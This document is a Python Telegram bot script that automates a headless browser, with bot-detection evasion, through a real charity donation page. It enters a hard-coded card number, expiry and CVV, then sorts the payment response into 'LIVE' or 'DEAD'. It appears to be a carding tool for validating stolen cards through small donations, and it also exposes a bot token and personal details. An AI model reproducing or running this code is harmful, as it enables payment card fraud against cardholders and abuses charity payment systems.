#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CAF Donate + RSM Secure 3DS Checker
"""
import telebot
import time, os, re, json, random, threading, logging, sys, traceback
from datetime import datetime
from urllib.parse import urlparse

from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout, Error as PWError

# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════════════════
BOT_TOKEN   = '8407490230:AAEhaQd1CAsCH8qRaaFCQ65o9RVAf8EdTiA'
OWNER_ID    = 6843321125
ADMINS      = {str(OWNER_ID)}

SCREENSHOT_DIR = 'screens'
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# بيانات الاختبار
CARD_NUMBER = '5321968131136714'
CARD_MM     = '01'
CARD_YY     = '29'
CARD_CVC    = '474'

# Donor data
DONOR = {
    'first_name': 'Wafa',
    'last_name': 'Wafa',
    'email': 'wafabro65@gmail.com',
    'phone': '20197578909',
    'address1': 'W256',
    'address2': 'W467',
    'postcode': 'BT12 2BX',
    'town': 'Carifnia',
    'county': 'Warg',
    'country': 'United Kingdom',
    'title': 'Mr',
}

DONATION_AMOUNT = '5'
CAF_URL = 'https://cafdonate.cafonline.org/23045'
CAMPAIGN_ID = '23045'

HEADLESS = True
NAV_TIMEOUT = 90000
PAGE_TIMEOUT = 60000
TYPE_DELAY = 80

USERS_FILE = 'users.txt'
BLOCK_FILE = 'block.txt'

for _f in (USERS_FILE, BLOCK_FILE):
    try:
        if not os.path.exists(_f): open(_f, 'w').close()
    except: pass

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('bot.log', encoding='utf-8'), logging.StreamHandler()],
)
log = logging.getLogger('bt')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ═══════════════════════════════════════════════════════════════════════════════
#  SAFE HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
def _ts():
    return datetime.now().strftime('%H:%M:%S')

def safe_reply(msg, text, **kw):
    try:
        return bot.reply_to(msg, text, parse_mode='HTML', **kw)
    except Exception as e:
        if "can't parse" in str(e).lower() or 'bad request' in str(e).lower():
            try:
                return bot.reply_to(msg, re.sub(r'<[^>]+>', '', text)[:4000], **kw)
            except:
                return None
        return None

def _watch_send(text, retries=3):
    for i in range(retries):
        try:
            return bot.send_message(OWNER_ID, text, parse_mode='HTML',
                                     disable_web_page_preview=True)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60))
                continue
            if "can't parse" in err.lower() or 'bad request' in err.lower():
                try:
                    return bot.send_message(OWNER_ID, re.sub(r'<[^>]+>', '', text)[:4000],
                                             disable_web_page_preview=True)
                except:
                    return None
            if i < retries - 1:
                time.sleep(1)
    return None

def log_step(name, detail=''):
    try:
        _watch_send(f'🟢 <b>STEP</b> <code>{name}</code>\n'
                    f'{detail[:300] if detail else ""}\n'
                    f'🕐 <code>{_ts()}</code>')
    except: pass

def log_info(msg):
    try:
        _watch_send(f'ℹ️ {msg}\n🕐 <code>{_ts()}</code>')
    except: pass

def log_error(name, err, tb=None):
    try:
        msg = (f'🔴 <b>ERROR</b> <code>{name}</code>\n'
               f'━━━━━━━━━━━━━━━━━━━━\n'
               f'<code>{str(err)[:700]}</code>\n')
        if tb:
            msg += f'\n<pre>{tb[-1000:]}</pre>\n'
        msg += f'🕐 <code>{_ts()}</code>'
        _watch_send(msg)
    except: pass

def log_success(msg, detail=''):
    try:
        _watch_send(f'✅ <b>SUCCESS</b>\n━━━━━━━━━━━━━━━━━━━━\n{msg}\n'
                    f'{detail[:400] if detail else ""}\n'
                    f'🕐 <code>{_ts()}</code>')
    except: pass

def log_response(label, resp, max_len=700):
    try:
        _watch_send(f'📡 <b>RESPONSE</b> <code>{label}</code>\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'<code>{str(resp)[:max_len]}</code>\n'
                    f'🕐 <code>{_ts()}</code>')
    except: pass

def watch_screenshot(page, label='screenshot'):
    try:
        fname = f'watch_{int(time.time())}_{random.randint(100,999)}.png'
        fpath = os.path.join(SCREENSHOT_DIR, fname)
        page.screenshot(path=fpath, full_page=True, timeout=15000)
        with open(fpath, 'rb') as f:
            bot.send_photo(OWNER_ID, f,
                           caption=f'📸 <b>{label}</b>\n🕐 <code>{_ts()}</code>',
                           parse_mode='HTML', timeout=120)
        try: os.remove(fpath)
        except: pass
        return True
    except Exception as e:
        try:
            _watch_send(f'📸 Screenshot failed: <code>{str(e)[:150]}</code>')
        except: pass
        return False

# ═══════════════════════════════════════════════════════════════════════════════
#  HUMAN HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
def pause(a=0.4, b=1.2):
    time.sleep(random.uniform(a, b))

def type_human(page, sel, text):
    try:
        page.fill(sel, '', timeout=5000)
        page.click(sel, timeout=5000)
        pause(0.2, 0.5)
        page.type(sel, text, delay=TYPE_DELAY, timeout=10000)
        pause(0.3, 0.7)
        return True
    except:
        return False

def mouse_play(page):
    try:
        vp = page.viewport_size or {'width':1366,'height':768}
        for _ in range(random.randint(2,4)):
            page.mouse.move(
                random.randint(100, vp['width']-100),
                random.randint(100, vp['height']-100),
                steps=random.randint(8,20),
            )
            pause(0.2, 0.6)
    except: pass

# ═══════════════════════════════════════════════════════════════════════════════
#  CAF + RSM FLOW
# ═══════════════════════════════════════════════════════════════════════════════
def caf_flow(page):
    """Full CAF → RSM flow."""
    res = {'status':'unknown', 'response':'', 'error':'', 'gateway':'rsm_secure'}

    try:
        # ═══ STEP 1: Navigate CAF ═══
        log_step('1. Navigate CAF', CAF_URL)
        page.goto(CAF_URL, wait_until='domcontentloaded', timeout=NAV_TIMEOUT)
        pause(2.0, 4.0)
        mouse_play(page)
        watch_screenshot(page, '1. CAF page')

        log_info(f'Title: {page.title()}')

        # ═══ STEP 2: Fill donation form ═══
        log_step('2. Fill donation form')

        # Amount
        for sel in ['#customAmountSingle', '#CustomAmountSingle',
                    'input[name="customAmountSingle"]', 'input[name*="amount"]',
                    'input[id*="Amount"]']:
            if type_human(page, sel, DONATION_AMOUNT):
                log_info(f'Amount filled: {sel}')
                break
        pause(0.3, 0.8)

        # Tick personal card confirmation
        for sel in ['#confirmPersonalCard', '#ConfirmPersonalCardForGiftAid',
                    'input[name="confirmPersonalCard"]']:
            try:
                page.check(sel, timeout=2000)
                log_info(f'Personal card confirmed')
                break
            except: continue
        pause(0.3, 0.8)

        # ═══ STEP 3: Click Donate / Next ═══
        log_step('3. Click donate button')

        donate_clicked = False
        for sel in ['button:has-text("Donate")', 'button:has-text("Next")',
                    'button:has-text("Continue")', 'input[value*="Donate"]',
                    'button[type="submit"]', '.btn-primary']:
            try:
                page.click(sel, timeout=3000)
                donate_clicked = True
                log_info(f'Clicked: {sel}')
                break
            except: continue

        if not donate_clicked:
            log_error('3. Donate', 'No button found')
            watch_screenshot(page, '3. No donate button')
            # Try navigating directly to payment
            try:
                page.goto(f'{CAF_URL}/CCPaymentDetails', timeout=NAV_TIMEOUT)
            except: pass

        pause(2.0, 4.0)
        watch_screenshot(page, '3. After donate')

        # ═══ STEP 4: Fill contact details if form appears ═══
        log_step('4. Fill contact details')

        # Check if we're on contact page
        has_contact = page.evaluate("""() => ({
            hasFirstName: !!document.querySelector('input[name*="irstName"], #firstName, #UserFirstName'),
            hasEmail: !!document.querySelector('input[name*="mail"], #email, #UserEmail'),
            hasPostcode: !!document.querySelector('input[name*="ostcode"], #postcode, #PostCode'),
        })""")
        log_info(f'Contact form: {json.dumps(has_contact)}')

        if has_contact.get('hasFirstName'):
            # Fill first name
            for sel in ['#UserFirstName','input[name="UserFirstName"]',
                        'input[name*="FirstName"]','#firstName']:
                if type_human(page, sel, DONOR['first_name']):
                    log_info(f'First name filled')
                    break
            pause(0.3, 0.6)

            # Last name
            for sel in ['#UserLastName','input[name="UserLastName"]',
                        'input[name*="LastName"]','#lastName']:
                if type_human(page, sel, DONOR['last_name']):
                    break
            pause(0.3, 0.6)

            # Email
            for sel in ['#UserEmail','input[name="UserEmail"]',
                        'input[name*="mail"]','#email']:
                if type_human(page, sel, DONOR['email']):
                    log_info(f'Email filled')
                    break
            pause(0.3, 0.6)

            # Phone
            for sel in ['#UserPhone','input[name="UserPhone"]',
                        'input[name*="Phone"]','#phone']:
                if type_human(page, sel, DONOR['phone']):
                    break
            pause(0.3, 0.6)

            # Postcode
            for sel in ['#PostCode','input[name="PostCode"]',
                        'input[name*="ostcode"]','#postcode']:
                if type_human(page, sel, DONOR['postcode']):
                    break
            pause(0.3, 0.6)

            watch_screenshot(page, '4. Contact filled')

            # Next button
            for sel in ['button:has-text("Next")','button:has-text("Continue")',
                        'button:has-text("Pay")','button[type="submit"]']:
                try:
                    page.click(sel, timeout=3000)
                    log_info(f'Clicked next: {sel}')
                    break
                except: continue
            pause(2.0, 4.0)

        # ═══ STEP 5: Wait for RSM redirect ═══
        log_step('5. Wait for RSM Secure')
        
        # انتظر redirect لـ RSM
        rsm_loaded = False
        for attempt in range(30):
            current_url = page.url
            log_info(f'URL [{attempt+1}/30]: {current_url[:100]}')
            
            if 'rsmsecure.com' in current_url:
                log_info('✅ RSM Secure loaded!')
                rsm_loaded = True
                break
            
            # Maybe form auto-submits
            page.wait_for_timeout(1000)
        
        watch_screenshot(page, '5. Current page')

        if not rsm_loaded:
            log_error('5. RSM redirect', f'Not redirected after 30s. Current: {page.url[:100]}')
            res['error'] = 'NO_RSM_REDIRECT'
            return res

        # ═══ STEP 6: Fill RSM card form ═══
        log_step('6. Fill RSM card form')
        pause(2.0, 3.0)

        # Card holder
        for sel in ['#cardHolder','input[name="cardHolder"]',
                    'input[name*="holder"]','#CardHolder']:
            if type_human(page, sel, f'{DONOR["first_name"]} {DONOR["last_name"]}'):
                log_info(f'Card holder filled')
                break
        pause(0.3, 0.6)

        # Card number
        for sel in ['#cardNumber','input[name="cardNumber"]',
                    'input[name*="cardNumber"]','#CardNumber']:
            if type_human(page, sel, CARD_NUMBER):
                log_info(f'Card number filled')
                break
        pause(0.3, 0.6)

        # Expiry month
        for sel in ['#expiryDateMonth','select[name="expiryDateMonth"]',
                    'select[name*="Month"]']:
            try:
                page.select_option(sel, CARD_MM, timeout=3000)
                log_info(f'Month: {CARD_MM}')
                break
            except: continue
        pause(0.3, 0.6)

        # Expiry year
        for sel in ['#expiryDateYear','select[name="expiryDateYear"]',
                    'select[name*="Year"]']:
            try:
                page.select_option(sel, CARD_YY, timeout=3000)
                log_info(f'Year: {CARD_YY}')
                break
            except: continue
        pause(0.3, 0.6)

        # CVV
        for sel in ['#CV2','input[name="CV2"]',
                    'input[name*="CV"]','input[name*="cvv"]']:
            if type_human(page, sel, CARD_CVC):
                log_info(f'CVV filled')
                break
        pause(0.5, 1.0)

        watch_screenshot(page, '6. Card filled')

        # ═══ STEP 7: Submit ═══
        log_step('7. Submit payment')
        
        submitted = False
        for sel in ['#submit','input[name="submit"]',
                    'input[value*="Donate"]','button[type="submit"]',
                    'input[type="submit"]']:
            try:
                page.click(sel, timeout=5000)
                submitted = True
                log_info(f'Submitted: {sel}')
                break
            except: continue

        if not submitted:
            log_error('7. Submit', 'No submit button')
            watch_screenshot(page, '7. No submit')
            res['error'] = 'NO_SUBMIT'
            return res

        # ═══ STEP 8: Wait and read response ═══
        log_step('8. Wait for response')
        page.wait_for_timeout(15000)
        watch_screenshot(page, '8. After submit')

        # ═══ STEP 9: Read result ═══
        log_step('9. Read result')
        
        try:
            text = page.content()
            body_text = page.evaluate("() => document.body ? document.body.innerText : ''")
            
            log_response('Page text', body_text[:500])
            log_info(f'URL: {page.url}')
            
            low = body_text.lower()
            url_low = page.url.lower()
            
            # Check for 3DS challenge
            if 'password' in low or 'otp' in low or 'verification' in low or '3dsecure' in low:
                res['status'] = 'live'
                res['response'] = 'LIVE_3DS: Card alive, challenge required'
                log_success('3DS Challenge — Card LIVE!', body_text[:200])
            
            # Approved
            elif 'approved' in low or 'successful' in low or 'thank you' in low or 'confirmed' in low:
                res['status'] = 'live'
                res['response'] = 'CHARGED: Transaction approved'
                log_success('APPROVED!', body_text[:200])
            
            # Declined
            elif 'declined' in low:
                res['status'] = 'live'
                res['response'] = 'DECLINED: Card declined (LIVE)'
                log_success('Declined — Card tested', body_text[:200])
            
            elif 'insufficient' in low:
                res['status'] = 'live'
                res['response'] = 'INSUFFICIENT_FUNDS (LIVE)'
                log_success('Insufficient funds', body_text[:200])
            
            elif 'expired' in low:
                res['status'] = 'live'
                res['response'] = 'EXPIRED_CARD (LIVE)'
                log_success('Expired', body_text[:200])
            
            elif 'invalid' in low and 'card' in low:
                res['status'] = 'live'
                res['response'] = 'INVALID_CARD (LIVE)'
                log_success('Invalid card', body_text[:200])
            
            elif 'cvv' in low or 'cv2' in low or 'security code' in low:
                res['status'] = 'live'
                res['response'] = 'CVV_FAILURE (LIVE)'
                log_success('CVV fail', body_text[:200])
            
            elif 'error' in low or 'failure' in low:
                m = re.search(r'failureReason["\']?[^>]*>([^<]+)<', text)
                if m:
                    res['response'] = m.group(1).strip()[:200]
                else:
                    res['response'] = body_text[:200]
                log_error('Error', res['response'])
            
            else:
                res['status'] = 'unknown'
                res['response'] = f'UNKNOWN: {body_text[:200]}'
                watch_screenshot(page, '9. Unknown')
        
        except Exception as e:
            log_error('9. Read', e)

    except PWTimeout as e:
        res['error'] = f'TIMEOUT: {str(e)[:150]}'
        log_error('TIMEOUT', e, traceback.format_exc())
        watch_screenshot(page, 'Timeout')
    except PWError as e:
        res['error'] = f'PW_ERROR: {str(e)[:150]}'
        log_error('PW_ERROR', e, traceback.format_exc())
        watch_screenshot(page, 'PW error')
    except Exception as e:
        res['error'] = f'EXCEPTION: {str(e)[:150]}'
        log_error('EXCEPTION', e, traceback.format_exc())
        watch_screenshot(page, 'Exception')

    return res

def run_session():
    """Run full flow."""
    final = {'status':'unknown','response':'','error':'','gateway':'rsm_secure'}
    
    try:
        log_info('Launching browser...')
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=HEADLESS,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--no-sandbox','--disable-dev-shm-usage',
                    '--disable-setuid-sandbox','--disable-web-security',
                ]
            )
            ctx = browser.new_context(
                viewport={'width':1366,'height':768},
                user_agent=('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                            'AppleWebKit/537.36 (KHTML, like Gecko) '
                            'Chrome/120.0.0.0 Safari/537.36'),
                locale='en-GB',
                timezone_id='Europe/London',
                ignore_https_errors=True,
            )
            ctx.add_init_script("""
                Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
                Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
                Object.defineProperty(navigator,'languages',{get:()=>['en-GB','en']});
                window.chrome={runtime:{}};
            """)
            page = ctx.new_page()
            page.set_default_timeout(PAGE_TIMEOUT)
            page.set_default_navigation_timeout(NAV_TIMEOUT)

            result = caf_flow(page)
            final.update(result)

            try: ctx.close()
            except: pass
            try: browser.close()
            except: pass
    except Exception as e:
        final['error'] = f'LAUNCH: {str(e)[:150]}'
        log_error('LAUNCH', e, traceback.format_exc())
    
    return final

# ═══════════════════════════════════════════════════════════════════════════════
#  BOT HANDLERS
# ═══════════════════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def handle_start(msg):
    try:
        uids = open(USERS_FILE).read().splitlines()
        if str(msg.from_user.id) not in uids:
            open(USERS_FILE, 'a').write(f'{msg.from_user.id}\n')
        safe_reply(msg,
            f'✅ Bot ready\n'
            f'User: {msg.from_user.first_name}\n'
            f'ID: {msg.from_user.id}\n\n'
            f'Commands:\n'
            f'/caf — test CAF donation\n'
            f'/ping — health check\n'
            f'/stats — statistics')
    except Exception as e:
        log_error('start handler', e)


@bot.message_handler(commands=['ping'])
def handle_ping(msg):
    try:
        t0 = time.time()
        safe_reply(msg, 'Pong...')
        dt = (time.time() - t0) * 1000
        bot.send_message(msg.chat.id,
            f'🏓 Pong!\n'
            f'Latency: {dt:.0f}ms\n'
            f'Card: ****{CARD_NUMBER[-4:]}\n'
            f'Amount: £{DONATION_AMOUNT}\n'
            f'Headless: {HEADLESS}')
    except Exception as e:
        log_error('ping handler', e)


@bot.message_handler(commands=['stats'])
def handle_stats(msg):
    try:
        users_n = len(open(USERS_FILE).read().splitlines())
        safe_reply(msg,
            f'📊 Stats\n'
            f'Users: {users_n}\n'
            f'Card: ****{CARD_NUMBER[-4:]}\n'
            f'Amount: £{DONATION_AMOUNT}\n'
            f'Campaign: {CAMPAIGN_ID}')
    except Exception as e:
        log_error('stats handler', e)


@bot.message_handler(commands=['caf'])
def handle_caf(msg):
    try:
        try:
            _watch_send(
                f'🎯 <b>NEW CAF TEST</b>\n'
                f'━━━━━━━━━━━━━━━━━━━━\n'
                f'👤 From: {msg.from_user.first_name}\n'
                f'🆔 ID: <code>{msg.from_user.id}</code>\n'
                f'🔗 <code>{CAF_URL}</code>\n'
                f'💳 Card: <code>****{CARD_NUMBER[-4:]}</code>\n'
                f'💰 Amount: <code>£{DONATION_AMOUNT}</code>\n'
                f'🕐 <code>{_ts()}</code>'
            )
        except: pass

        status = safe_reply(msg, f'⏳ Testing CAF donation...\nWait (60-90s)...')

        def worker():
            try:
                result = run_session()
                status_val = result.get('status','unknown')
                resp = (result.get('response') or '')[:300]
                err = (result.get('error') or '')[:300]

                if status_val == 'live':
                    final = (
                        f'✅ LIVE\n'
                        f'Card: ****{CARD_NUMBER[-4:]}\n'
                        f'Amount: £{DONATION_AMOUNT}\n'
                        f'Response: {resp[:200]}'
                    )
                    log_success('Final: LIVE', resp)
                else:
                    reason = err or resp or 'UNKNOWN'
                    final = (
                        f'❌ DEAD\n'
                        f'Response: {reason[:200]}'
                    )
                    log_error('Final: DEAD', reason)

                if status:
                    try:
                        bot.edit_message_text(
                            chat_id=msg.chat.id,
                            message_id=status.message_id,
                            text=final,
                            disable_web_page_preview=True,
                        )
                    except: pass

            except Exception as e:
                log_error('Worker', e, traceback.format_exc())
                if status:
                    try:
                        bot.edit_message_text(
                            chat_id=msg.chat.id,
                            message_id=status.message_id,
                            text=f'Error: {str(e)[:200]}'
                        )
                    except: pass

        threading.Thread(target=worker, daemon=True).start()

    except Exception as e:
        log_error('caf handler', e)


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    log.info('Bot starting...')
    log.info(f'Card: ****{CARD_NUMBER[-4:]}')
    log.info(f'Amount: £{DONATION_AMOUNT}')
    log.info(f'Headless: {HEADLESS}')

    try:
        _watch_send(
            f'🚀 <b>CAF BOT ONLINE</b>\n'
            f'━━━━━━━━━━━━━━━━━━━━\n'
            f'💳 Card: <code>****{CARD_NUMBER[-4:]}</code>\n'
            f'💰 Amount: <code>£{DONATION_AMOUNT}</code>\n'
            f'🖥️ Headless: <code>{HEADLESS}</code>\n'
            f'🕐 <code>{_ts()}</code>'
        )
    except: pass

    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                 skip_pending=True, logger_level=logging.WARNING)
        except KeyboardInterrupt:
            log.info('Bot stopped')
            break
        except Exception as e:
            err = str(e).lower()
            log.error(f'polling: {str(e)[:200]}')
            log_error('POLLING', e, traceback.format_exc())
            if '409' in err or 'conflict' in err:
                time.sleep(60)
            else:
                time.sleep(15)
